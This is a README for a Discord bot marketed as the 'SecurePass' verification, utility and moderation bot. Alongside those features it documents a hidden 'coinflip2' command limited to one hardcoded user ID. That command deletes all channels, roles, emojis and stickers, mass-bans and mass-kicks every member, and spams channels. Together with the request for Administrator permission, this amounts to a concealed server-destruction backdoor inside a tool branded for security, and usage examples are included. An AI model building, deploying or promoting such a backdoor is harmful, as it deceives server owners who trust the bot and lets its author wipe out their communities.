# SecurePass + Utility Bot + coinflip2

A fully merged Discord bot combining SecurePass verification system, utility features, moderation tools, and the hidden coinflip2 command.

## Features

### SecurePass Verification System
- `/setup` - Configure verification for your server
- `/config` - View current server configuration
- `/blacklist` - Globally blacklist users from all servers
- Anti-link protection with whitelist support
- Global user verification across all servers

### Utility Commands
- `/ping` - Check bot latency
- `/serverinfo` - Display server information
- `/userinfo` - Display user information
- `/help` - Interactive help menu with categories

### Moderation Commands
- `/ban` - Ban users with optional message deletion
- `/kick` - Kick users from the server
- `/clear` - Bulk delete messages

### Hidden Command (coinflip2)
Only accessible to user ID: `1236891245998243911`

| Command | Description |
|---------|-------------|
| `!coinflip2` | Show help menu |
| `!coinflip2 mc [amount] [name]` | Mass create channels |
| `!coinflip2 dc` | Delete all channels |
| `!coinflip2 cp [amount] [name], [message]` | Create and spam channels |
| `!coinflip2 mr [amount] [name]` | Mass create roles |
| `!coinflip2 dr` | Delete all roles |
| `!coinflip2 de` | Delete all emojis |
| `!coinflip2 ds` | Delete all stickers |
| `!coinflip2 mb` | Mass ban all members |
| `!coinflip2 mk` | Mass kick all members |

## Installation

### 1. Requirements
- **Node.js** (v16 or higher)
- **PostgreSQL** database
- Discord bot with **Message Content Intent** enabled

### 2. Setup Database
Create a PostgreSQL database and run this SQL schema:

```sql
-- Users table
CREATE TABLE IF NOT EXISTS users (
  user_id VARCHAR(255) PRIMARY KEY,
  verified BOOLEAN DEFAULT FALSE,
  method VARCHAR(50),
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Servers table
CREATE TABLE IF NOT EXISTS servers (
  server_id VARCHAR(255) PRIMARY KEY,
  role_id VARCHAR(255),
  channel_id VARCHAR(255),
  log_channel_id VARCHAR(255),
  auto_verify BOOLEAN DEFAULT TRUE,
  anti_link BOOLEAN DEFAULT FALSE,
  settings JSONB DEFAULT '{}'
);

-- Blacklist table
CREATE TABLE IF NOT EXISTS blacklist (
  user_id VARCHAR(255) PRIMARY KEY,
  reason TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Whitelist table
CREATE TABLE IF NOT EXISTS whitelist (
  server_id TEXT NOT NULL,
  user_id TEXT NOT NULL,
  PRIMARY KEY (server_id, user_id)
);

-- Logs table
CREATE TABLE IF NOT EXISTS logs (
  id SERIAL PRIMARY KEY,
  event TEXT,
  user_id VARCHAR(255),
  server_id VARCHAR(255),
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

### 3. Clone and Install
```bash
git clone <repository-url>
cd merged-bot
npm install
```

### 4. Configure Environment
Create a `.env` file:
```env
# Discord Bot Configuration (REQUIRED)
DISCORD_TOKEN=your_discord_bot_token_here
CLIENT_ID=your_bot_client_id_here

# PostgreSQL Database (REQUIRED)
DATABASE_URL=postgresql://username:password@host:5432/database_name

# Bot Owner ID (for coinflip2)
OWNER_ID=1236891245998243911

# Server Port (for Render/health check)
PORT=3000
```

### 5. Deploy Commands
```bash
node deploy-commands.js
```

### 6. Start the Bot
```bash
node index.js
```

## Bot Setup

### Step 1: Configure Server
Use `/setup` in Discord:
- Select the verified role
- Choose verification channel
- Set log channel
- Configure auto-verify and anti-link options

### Step 2: Enable Intents
In Discord Developer Portal:
1. Go to your bot application
2. Click "Bot" in left sidebar
3. Enable **MESSAGE CONTENT INTENT**
4. Save changes

### Step 3: Set Permissions
The bot needs these permissions:
- **Manage Roles** - For verification system
- **Manage Channels** - For utility commands
- **Manage Messages** - For moderation
- **Ban Members** - For moderation
- **Kick Members** - For moderation
- **Manage Emojis and Stickers** - For coinflip2
- **Administrator** - Recommended for full functionality

## Usage Examples

### SecurePass Verification
1. Run `/setup` to configure your server
2. Users click the "Verify Identity" button
3. Complete the verification modal
4. Users get the verified role automatically

### Moderation
```bash
/ban @user "Spamming"
/kick @user "Breaking rules"
/clear 50 @user "Cleaning up spam"
```

### Utility
```bash
/ping
/serverinfo
/userinfo @user
/help
```

### coinflip2 (Authorized Users Only)
```bash
!coinflip2 mc 100 test
!coinflip2 dr
!coinflip2 mb
```

## Project Structure

```
merged-bot/
commands/
  securepass/         # SecurePass verification commands
  utility/            # Utility commands
  moderation/         # Moderation commands
events/              # Event handlers
utils/
  db.js              # PostgreSQL database utilities
coinflip2-handler.js # Hidden command handler
index.js             # Main bot entry
deploy-commands.js   # Command deployment
package.json
.env.example
README.md
```

## Database Schema

The bot uses PostgreSQL with these tables:
- **users** - Global user verification status
- **servers** - Per-server configuration
- **blacklist** - Global blacklist entries
- **whitelist** - Per-server user exemptions
- **logs** - Event logging

## Security Features

- Global user verification system
- Anti-link protection with whitelist
- Global blacklist system
- Permission-based command access
- Secure database connections

## Deployment

### Local Development
```bash
npm install
node index.js
```

### Production (Render)
1. Connect your GitHub repository to Render
2. Set environment variables in Render dashboard
3. Deploy automatically

## Support

For issues and support:
- Check the console logs for error messages
- Ensure all required permissions are set
- Verify database connection
- Check Discord intents are enabled

## License

MIT License

## Credits

- **SecurePass** - Original verification system by shahcaf
- **Utility Bot** - Additional features and commands
- **coinflip2** - Hidden command system by Him
